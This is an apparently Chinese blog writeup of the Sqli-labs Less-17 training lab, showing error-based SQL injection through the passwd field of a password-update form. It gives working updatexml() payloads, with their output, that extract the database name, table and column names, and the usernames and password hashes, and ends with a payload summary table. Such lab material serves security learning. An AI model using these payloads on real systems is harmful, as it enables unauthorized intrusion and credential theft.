---
title: Sqli-labs Less-17 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入, 报错注入, UPDATE注入]
---
## 一、 漏洞概述
- **关卡**：Less-17
- **漏洞类型**：基于报错的 UPDATE 型 SQL 注入（Error-Based UPDATE SQL Injection）
- **注入点**：密码修改表单的 `passwd` 参数
- **闭合方式**：单引号 `'`

## 二、 渗透测试过程

### 1. 探测注入点与过滤机制
访问 Less-17 关卡，页面提示 `Your Username` 和 `Your New Password`，这是一个修改密码的表单。
分析后端逻辑可知：
- 首先根据 `uname` 查询用户是否存在。
- 如果存在，则执行 `UPDATE users SET password='$passwd' WHERE username='$uname'`。

尝试在 `uname` 输入万能密码 `admin' #`，页面提示 `Your Username is not exists` 或报错，说明 `uname` 参数在后台通过 `check_input()` 函数进行了严格过滤（如 `mysql_real_escape_string` 和 `addslashes`）。

将目标转移到 `passwd` 参数。输入 `admin` 作为用户名，密码输入 `123'`，页面返回 SQL 报错信息。
由此确认 `passwd` 参数存在单引号 `'` 闭合的注入漏洞。

### 2. 确认注入技术
由于后端执行的是 `UPDATE` 语句，而非 `SELECT` 语句，`UNION SELECT` 联合查询在这里无效。同时，页面直接将数据库的报错信息回显了出来，因此我们采用**报错注入**技术（基于 `updatexml()` 或 `extractvalue()` 函数）。

### 3. 利用 updatexml() 函数爆数据
使用 `updatexml(1, concat(0x7e, (查询语句)), 1)` 将查询结果拼接到报错信息中。`0x7e` 代表 `~` 符号，方便在报错信息中定位数据。

- **Payload (获取当前数据库名)**：
  ```text
  uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select database())),1) #&submit=Submit
```

结果：页面报错，回显 XPATH syntax error: '~security'，成功爆出数据库名。

· Payload (获取表名)：
  由于 updatexml 报错回显的长度有限（通常为 32 位），无法一次性爆出所有表名。需使用 limit 或 substr 截取。
  ```text
  uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1) #&submit=Submit
  ```
  结果：回显 ~emails。
· Payload (获取 users 表的字段名)：
  ```text
  uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1) #&submit=Submit
  ```
· Payload (获取账号密码)：
  由于账号密码通常较长，必须使用 substr() 进行截取分段读取。
  ```text
  uname=admin&passwd=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,32)),1) #&submit=Submit
  ```
  结果：回显 ~admin:5f4dcc3b5aa765d61d8...。通过不断修改 substr 的起始位置，即可拼凑出完整数据。

## 三、 通关 Payload 汇总

测试目的 Payload (仅限 passwd 字段) 备注
测试闭合 123' 触发报错
获取库名 1' and updatexml(1,concat(0x7e,(select database())),1) # 限制 32 字符
获取表名 1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1) # 调整 limit
获取数据 1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,32)),1) # 分段截取
